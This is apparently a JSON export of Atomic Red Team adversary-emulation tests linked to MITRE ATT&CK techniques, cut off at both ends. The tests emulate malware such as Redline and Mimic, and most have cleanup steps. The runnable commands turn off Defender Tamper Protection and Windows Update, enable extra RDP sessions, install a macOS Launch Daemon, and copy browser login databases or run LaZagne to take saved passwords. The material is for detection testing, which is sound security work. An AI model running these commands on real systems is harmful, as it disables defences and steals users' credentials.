"cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Mimic Ransomware - Allow Multiple RDP Sessions per User", "auto_generated_guid": "35727d9e-7a7f-4d0c-a259-dc3906d6e8b9", "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Event Viewer Registry Modification - Redirection URL", "auto_generated_guid": "6174be7f-5153-4afd-92c5-e0c3b7cdb5ae", "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.", "supported_platforms": ["windows"], "input_arguments": {"redirection_url": {"description": "URL to open or file URI to execute upon opening the event help", "type": "url", "default": "file://C:\\windows\\system32\\notepad.exe"}}, "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f", "name": "command_prompt", "elevation_required": true}}, {"name": "Event Viewer Registry Modification - Redirection Program", "auto_generated_guid": "81483501-b8a5-4225-8b32-52128e2f69db", "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.", "supported_platforms": ["windows"], "input_arguments": {"redirection_program": {"description": "Path of the program to execute upon opening the event help", "type": "path", "default": "C:\\windows\\system32\\notepad.exe"}}, "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f", "name": "command_prompt", "elevation_required": true}}, {"name": "Enabling Remote Desktop Protocol via Remote Registry", "auto_generated_guid": "e3ad8e83-3089-49ff-817f-e52f8c948090", "description": "Enabling RDP through remote registry.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 2 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Win Defender Notification", "auto_generated_guid": "12e03af7-79f9-4f95-af48-d3f12f28a260", "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 0 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows OS Auto Update", "auto_generated_guid": "01b20ca8-c7a3-4d86-af59-059f15ed5474", "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 0 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Auto Reboot for current logon user", "auto_generated_guid": "396f997b-c5f8-4a96-bb2c-3c8795cf459d", "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 0 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Auto Update Option to Notify before download", "auto_generated_guid": "335a6b15-b8d2-4a3f-a973-ad69aa2620d7", "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 3 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Do Not Connect To Win Update", "auto_generated_guid": "d1de3767-99c2-4c6c-8c5a-4ba4586474c8", "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 0 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Tamper Win Defender Protection", "auto_generated_guid": "3b625eaa-c10d-4635-af96-3eae7d2a2f3c", "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 5 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Snake Malware Registry Blob", "auto_generated_guid": "8318ad20-0488-4a64-98f4-72525a012f6b", "description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n", "supported_platforms": ["windows"], "executor": {"command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null\n", "cleanup_command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; Remove-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -ErrorAction SilentlyContinue | Out-Null\n", "name": "powershell", "elevation_required": true}}, {"name": "Allow Simultaneous Download Registry", "auto_generated_guid": "37950714-e923-4f92-8c7c-51e4b6fffbf6", "description": "A registry modification to allow Simultaneous download in the system.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n", "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Modify Internet Zone Protocol Defaults in Current User Registry - cmd", "auto_generated_guid": "c88ef166-50fa-40d5-a80c-e2b87d4180f7", "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n", "cleanup_command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 3 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 3 /F\n", "name": "command_prompt"}}, {"name": "Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell", "auto_generated_guid": "b1a4d687-ba52-4057-81ab-757c3dc0d3b5", "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n", "supported_platforms": ["windows"], "executor": {"command": "# Set the registry values for http and https to 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0\n", "cleanup_command": "# Restore the registry values for http and https to 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 3\n", "name": "powershell"}}]}, "T1543.004": {"name": "Launch Daemon", "technique_id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba", "external_id": "T1543.004", "data_components": ["Service Creation", "Process Creation", "File Modification", "Command Execution", "File Creation", "Service Modification"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)", "atomic_tests": [{"name": "Launch Daemon", "auto_generated_guid": "03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf", "description": "Utilize LaunchDaemon to launch `Hello World`\n", "supported_platforms": ["macos"], "input_arguments": {"plist_filename": {"description": "filename", "type": "string", "default": "com.atomicredteam.plist"}, "path_malicious_plist": {"description": "Name of file to store in cron folder", "type": "string", "default": "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n", "prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\n", "cleanup_command": "sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}\nsudo rm /Library/LaunchDaemons/#{plist_filename}\nsudo rm /tmp/T1543_004_atomicredteam.txt\n"}}]}, "T1580": {"name": "Cloud Infrastructure Discovery", "technique_id": "attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d", "external_id": "T1580", "data_components": ["Volume Enumeration", "Snapshot Enumeration", "Cloud Storage Enumeration", "Instance Enumeration"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.", "atomic_tests": [{"name": "AWS - EC2 Enumeration from Cloud Instance", "auto_generated_guid": "99ee161b-dcb1-4276-8ecb-7cfdcb207820", "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n", "supported_platforms": ["linux", "macos", "iaas:aws"], "input_arguments": {"stratus_path": {"description": "Path of stratus binary", "type": "path", "default": "$PathToAtomicsFolder/T1580/src"}, "aws_region": {"description": "AWS region to detonate", "type": "string", "default": "us-west-2"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n", "prereq_command": "if test -f \"#{stratus_path}/stratus\"; then exit 0; else exit 1; fi\n", "get_prereq_command": "if [ \"$(uname)\" = \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi \n"}, {"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"}], "executor": {"command": "export AWS_REGION=#{aws_region}\ncd #{stratus_path}\necho \"Stratus: Start Warmup.\"\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\necho \"Stratus: Start Detonate.\"\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\n", "cleanup_command": "cd #{stratus_path}\necho \"Stratus: Start Cleanup.\"\n./stratus cleanup aws.discovery.ec2-enumerate-from-instance\necho \"Removing Stratus artifacts from local machine.\"\nrm -rf stratus*\n", "name": "sh", "elevation_required": false}}]}, "T1555.003": {"name": "Credentials from Web Browsers", "technique_id": "attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8", "external_id": "T1555.003", "data_components": ["Process Access", "File Access", "OS API Execution", "Command Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485"], "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).", "atomic_tests": [{"name": "Run Chrome-password Collector", "auto_generated_guid": "8c05b133-d438-47ca-a630-19cc464c4622", "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "File path for modified Sysinternals", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Modified Sysinternals must be located at #{file_path}\n", "prereq_command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"#{file_path}\\Modified-SysInternalsSuite.zip\" \"#{file_path}\\sysinternals\" -Force\nRemove-Item \"#{file_path}\\Modified-SysInternalsSuite.zip\" -Force\n"}], "executor": {"command": "Set-Location -path \"#{file_path}\\Sysinternals\";\n./accesschk.exe -accepteula .;\n", "cleanup_command": "Remove-Item \"#{file_path}\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Search macOS Safari Cookies", "auto_generated_guid": "c1402f7b-67ca-43a8-b5f3-3143abedc01b", "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n", "supported_platforms": ["macos"], "input_arguments": {"search_string": {"description": "String to search Safari cookies to find.", "type": "string", "default": "coinbase"}}, "executor": {"command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "name": "sh"}}, {"name": "LaZagne - Credentials from Browser", "auto_generated_guid": "9a2915b3-3954-4cce-8c76-00fbf4dbd014", "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n", "supported_platforms": ["windows"], "input_arguments": {"lazagne_path": {"description": "Path to LaZagne", "type": "path", "default": "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n", "prereq_command": "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{lazagne_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"#{lazagne_path}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "\"#{lazagne_path}\" browsers\n"}}, {"name": "Simulating access to Chrome Login Data", "auto_generated_guid": "3d111226-d09a-4911-8715-fe11664f960d", "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Chrome must be installed\n", "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"}], "executor": {"name": "powershell", "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n", "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore\n"}}, {"name": "Simulating access to Opera Login Data", "auto_generated_guid": "28498c17-57e4-495a-b0be-cc1e36de408b", "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Opera must be installed\n", "prereq_command": "if (((Test-Path \"$env:LOCALAPPDATA\\Programs\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Opera\\launcher.exe\"))) {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe\nStart-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'\nStart-Sleep -s 180\nStop-Process -Name \"opera\"\n"}, {"description": "Opera login data file must exist\n", "prereq_command": "if (Test-Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -ItemType File\n"}], "executor": {"name": "powershell", "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n", "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\n"}}, {"name": "Simulating access to Windows Firefox Login Data", "auto_generated_guid": "eb8da98a-2e16-4551-b3dd-83de49baa14c", "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in 